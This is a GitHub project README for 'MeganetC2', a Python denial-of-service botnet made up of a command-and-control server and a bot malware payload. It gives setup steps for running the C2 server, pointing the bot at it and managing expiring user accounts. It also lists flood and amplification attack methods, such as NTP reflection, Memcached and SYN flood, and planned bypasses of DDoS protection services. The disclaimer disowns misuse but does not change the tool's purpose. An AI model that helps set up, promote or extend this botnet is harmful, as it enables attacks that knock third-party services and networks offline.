<h1 align="center">MegaNet C2</h1>

<p align="center">
    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhL38wksPcGRif538q8qxOoCqVCEPKU22_9WZQ2WoBJv8ms_dGSZNAz8ewfejJLr9dH6Nbp_0WW4MLmX9Jv7i50oSCFq8QG5uHkS1THfeZk0sc11TgSuqpQk2AkVImUaYS9_GLzanq1H_OVfC6NkyLmhisyxnQ2-bxa-p4TPDvyk2c0CBkw_Mu2TF3mfKqt/s16000/Screenshot%202024-04-03%20205322.png">
</p>

<br>

 **MeganetC2** is a basic open source [denial of service](https://en.wikipedia.org/wiki/Denial-of-service_attack) [botnet](https://en.wikipedia.org/wiki/Botnet) system written in Python 3, consists of a connect and control server and a bot malware script.

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif"><br>

# Installation
1. Install Git and Python 3 on your server.
2. Clone the MeganetC2 Github repository to your server via Git: `$ git clone https://github.com/yutasato88/MeganetC2`.
3. Change the host address and C&C port in the configuration section in [bot.py](src/Payload/bot.py) to your server address and C&C port.
4. Install the requirements.txt
5. Start the C2 server by executing the command: `$ python main.py`.
6. Add accounts in [logins.txt](/src/logins.txt) using the format: `username:password:yyyy-mm-dd`.
7. Configure the port on the [config.json](/src/config.json) `{
"cnc_host": "0.0.0.0",
  "reg_host": "0.0.0.0",
  "cnc_port": 5511,
  "reg_port": 5512
}`.

8. Connect to the server through [PuTTY](https://www.putty.org/) on a raw socket connection.


<br>

📍 *Compiling the malware and installing it on vulnerable devices won't be told as it's highly illegal to get remote access to devices without permission. Use of this project for illegal activities is at own risk! I'm not responsible for any of your taken actions!*

<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif"><br>

<br>

# News
1. New method  `(HTTP SPOOFER) L7 Method`. 11/11/2023
2. New method  `(NTP Reflection + Payload) L4 Method`. 12/11/2023
3. New method  `(Memcached + Custom Payload) L4 Method`. 12/11/2023
4. New method  `(POD) L3 Method`. 13/11/2023
5. New method  `(ICMP) L3 Method`. 13/11/2023
6. Updated Method  `(HTTP IO) L7 Method`. 14/11/2023
7. Added expiration date for accounts `(AAAA-MM-DD)`. 26/11/2023
8. Update commands and visual. 02/12/2023
9. New method `(SYN Flood) L4 method` and `(ACK Flood) Removed`. 04/12/2023
10. Update visual and fix bugs. 01/22/2024

# Ideas
1. `Method:  OVH | Bypass OVH` 
2. `Method:  POST | POST Flood` 
3. `Method:  STRESS | Send HTTP Packet With High Byte`
4. `Method:  OSTRESS | STRESS Without Proxy`
5. `Method:  BYPASS | Bypass Normal AntiDDoS` 
6. `Method:  DGB | DDoS Guard Bypass` 
7. `Method:  AVB | Arvan Cloud Bypass`
8. **Send attacks with API's** 
9. **Optimize malicious code**


---


**👑Author:**

- **YutaSato**
- **Telegram: @hiyutaa**

